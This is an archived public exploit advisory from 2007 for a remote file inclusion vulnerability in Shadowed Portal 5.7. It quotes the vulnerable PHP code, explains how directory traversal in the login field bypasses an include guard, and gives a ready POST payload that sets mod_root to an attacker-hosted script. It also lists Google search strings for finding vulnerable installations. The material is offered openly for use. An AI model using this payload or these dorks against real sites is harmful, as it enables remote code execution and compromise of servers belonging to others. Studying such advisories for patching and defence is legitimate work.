<html><head><title>Shadowed Portal <= 5.7d3 (POST) Remote File Inclusion Vulnerability</title></head><pre> ____            __________         __             ____  __   
/_   | ____     |__\_____  \  _____/  |_          /_   |/  |_ 
 |   |/    \    |  | _(__  &lt;_/ ___\   __\  ______  |   \   __\
 |   |   |  \   |  |/       \  \___|  |   /_____/  |   ||  |  
 |___|___|  /\__|  /______  /\___  &gt;__|            |___||__|  
          \/\______|      \/     \/                           
------------------------------------------------------------------------------------------------
This is a Public Exploit. 21/12/2007 (dd-mm-yyyy)
------------------------------------------------------------------------------------------------
ยง Shadowed Portal 5.7 and maybe lower - Remote File Includes (Require) Vulnerabilities ยง
Vendor:	  http://www.shad0wed.com
Severity: Highest
Author:	  The:Paradox

Visit inj3ct-it.org

Proud to be Italian.
------------------------------------------------------------------------------------------------
Related Codes:

-- control.php; line 1:

&lt;?php

require(&quot;config.php&quot;);

require(&quot;globals.php&quot;);

require(&quot;functions.php&quot;);

require(&quot;variables.php&quot;);

$return = setvar(&quot;return&quot;);

if($act == &quot;login&quot;) {

$online = 0;

$usr = $_POST['usr'];

$pwd = $_POST['pwd'];

if(file_exists($root.&quot;/users/&quot;.strtolower($usr).&quot;.php&quot;)) {

require($root.&quot;/users/&quot;.strtolower($usr).&quot;.php&quot;);

}

-- globals.php; line 1:

&lt;?php

define('CHECK',md5(&quot;null&quot;));

global $viv;

global $mod;

global $act;

global $do;

global $act;

global $id;

global $tp;

global $w;

global $method;

global $board;

global $user;

global $pass;

global $cat;

global $linkback;

global $HTTP_POST_VARS;

global $_GET;

global $_POST;

global $_FILES;

global $HTTP_REFERER;

global $_SERVER;

-- /modules/fs/mod.php; line 1:

&lt;?php

if(!defined('CHECK')) { exit; }
require($mod_root.&quot;/config.php&quot;);

------------------------------------------------------------------------------------------------
Bug Explanation: 

This Portal presents a vulnerability in the &quot;login system&quot; that allows us to require a page &quot;.php&quot; in the directory &quot;/users/&quot; (whatever using directory transversal (&quot;../&quot;) we can require any page).

Additionally &quot;Check&quot; was defined by the required page globals.php, allowing us to bypass the &quot;security-die&quot; on the top of most php page (see /modules/fs/mod.php; line 1).
If we require &quot;/modules/fs/mod.php&quot; with a $mod_root value, we can require an external page of the site.

We can do Post Request to control.php?act=login with post values: usr=../modules/fs/mod&amp;pwd=casualpass&amp;mod_root=http://yoursite.org/yourscript? and get RFI.

------------------------------------------------------------------------------------------------
The require in control.php is extremely unsafe, it could be used with other pages to obtain other vulnerabilities.
------------------------------------------------------------------------------------------------
Google Dork-&gt; Powered by Shadowed Portal
Google Dork-&gt; These script's code is Copyright 2003-2006 by Shadowed Works.
------------------------------------------------------------------------------------------------
Use this exploit at your own risk. You are responsible for your own deeds.
------------------------------------------------------------------------------------------------
Use your brain, do not lame. Enjoy. =)

# milw0rm.com [2007-12-21]</pre></html>